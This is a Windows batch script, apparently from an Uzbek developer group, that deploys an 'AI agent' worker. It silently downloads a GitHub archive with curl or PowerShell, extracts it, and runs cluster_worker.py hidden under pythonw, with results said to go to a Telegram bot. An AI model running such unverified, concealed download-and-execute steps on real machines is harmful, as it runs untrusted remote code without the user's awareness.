@echo off
chcp 65001 >nul
title UZBEK CODERS - UNIVERSAL AVTOMAT AGENT
color 0A

set "TARGET_DIR=%USERPROFILE%\uzbekcodersbot"
if exist "%~dp0cluster_worker.py" set "TARGET_DIR=%~dp0"
if exist "D:\uzbekcodersbot\cluster_worker.py" set "TARGET_DIR=D:\uzbekcodersbot"

if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%" >nul 2>&1
cd /d "%TARGET_DIR%"

if not exist "%TARGET_DIR%\cluster_worker.py" (
    echo Yuklanmoqda...
    where curl.exe >nul 2>&1
    if %errorlevel% equ 0 (
        curl.exe -L "https://github.com/xakimovabdubannob-gif/cloud-node/archive/refs/heads/master.zip" -o "%TEMP%\master.zip" --silent
    ) else (
        powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('https://github.com/xakimovabdubannob-gif/cloud-node/archive/refs/heads/master.zip', '%TEMP%\master.zip')"
    )
    if exist "%TEMP%\master.zip" (
        where tar.exe >nul 2>&1
        if %errorlevel% equ 0 (
            tar.exe -xf "%TEMP%\master.zip" -C "%TEMP%"
        ) else (
            powershell -NoProfile -Command "Expand-Archive -Path '%TEMP%\master.zip' -DestinationPath '%TEMP%' -Force"
        )
        if exist "%TEMP%\cloud-node-master" (
            xcopy /E /Y /Q "%TEMP%\cloud-node-master\*" "%TARGET_DIR%\" >nul 2>&1
            rd /s /q "%TEMP%\cloud-node-master" >nul 2>&1
        )
        del /f /q "%TEMP%\master.zip" >nul 2>&1
    )
)

set "PYW_CMD="
where pythonw >nul 2>&1
if %errorlevel% equ 0 set "PYW_CMD=pythonw"
if not defined PYW_CMD (
    if exist "%LOCALAPPDATA%\Programs\Python\Python311\pythonw.exe" set "PYW_CMD=%LOCALAPPDATA%\Programs\Python\Python311\pythonw.exe"
    if exist "%LOCALAPPDATA%\Programs\Python\Python310\pythonw.exe" set "PYW_CMD=%LOCALAPPDATA%\Programs\Python\Python310\pythonw.exe"
    if exist "%LOCALAPPDATA%\Programs\Python\Python312\pythonw.exe" set "PYW_CMD=%LOCALAPPDATA%\Programs\Python\Python312\pythonw.exe"
    if exist "C:\Python311\pythonw.exe" set "PYW_CMD=C:\Python311\pythonw.exe"
    if exist "C:\Python310\pythonw.exe" set "PYW_CMD=C:\Python310\pythonw.exe"
)
if not defined PYW_CMD set "PYW_CMD=pythonw"

set WORKER_COUNT=4
set HEADLESS=1
set GUI_MODE=0

start "" "%PYW_CMD%" -X utf8 -u "%TARGET_DIR%\cluster_worker.py"

echo ======================================================================
echo  [OK] AI AGENT ORQA FONDA (DISPECHERDA) ISHGA TUSHIRILDI!
echo ======================================================================
echo.
echo  Kompyuter displeyida ortiqcha oyna ochilmaydi.
echo  Barcha natijalar Telegram botingizga yuborilmoqda.
echo.
echo  Ushbu oyna 3 soniyada avtomatik yopiladi...
timeout /t 3 >nul
exit